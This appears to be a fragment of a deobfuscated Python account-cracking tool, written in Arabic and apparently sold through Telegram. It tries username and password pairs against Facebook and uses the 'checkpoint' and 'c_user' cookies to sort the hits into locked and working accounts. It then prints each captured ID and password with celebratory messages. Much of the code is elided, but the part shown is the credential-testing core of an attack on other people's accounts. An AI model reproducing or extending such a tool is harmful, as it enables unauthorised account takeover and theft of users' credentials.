#  Deobf by Joker_obf
# file name: [اداه اسلام المدفوعه نار.py] (py - 3.11)
...
#expiry_time = datetime.strptime('2024-06-18 00:00:00.000', '%Y-%m-%d %H:%M:%S.%f')
#if current_time > expiry_time:
    #   print('انتهى التفعيل المجاني راسل المطور للاشتراك المدفوع @bsbsjhh')
   #    exit(0)
import webbrowser
webbrowser.open('https://t.me/bsbsjhh')
import datetime
#import pytz

#end_datetime = datetime.datetime(2024, 6, 18, 10, 30, 0) #
...
def menu(my_name,my_id):
  ...
  #  print('\033[1;37mᯓᯓᯓᯓ➩المبرمجᯓᯓᯓᯓᯓᯓ@bsbsjhh ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
...
def passwrd():
    ...
    print(M + logo)
 #   print('للشتراك بالاداه راسل على هاذه اليوزر @Islam85555')
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    ...
                    print('\n')
                    statuscp = f'''@bsbsjhh|@bsbsjhh\n\
اسلام جابلك حساب سكيور 
 ✓جميل💪🏻🇪🇬 : {idf}\n\n❖ - الباسورد💝🇪🇬 : {pw}\n\n \n Ror𓆪‏━─────⋙\n⊊𝗕𝗬⊋ ➩@bsbsjhh '''
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                if 'no' in taplikasi:
                    ...
                    print('\n')
                    statusok = f'''@bsbsjhh|@bsbsjhh\n
اسلام جابلك حساب شغال
✵ - ✓جميل💪🏻🇪🇬׀\n{idf}
✵ - الباسورد💝׀\n {pw}
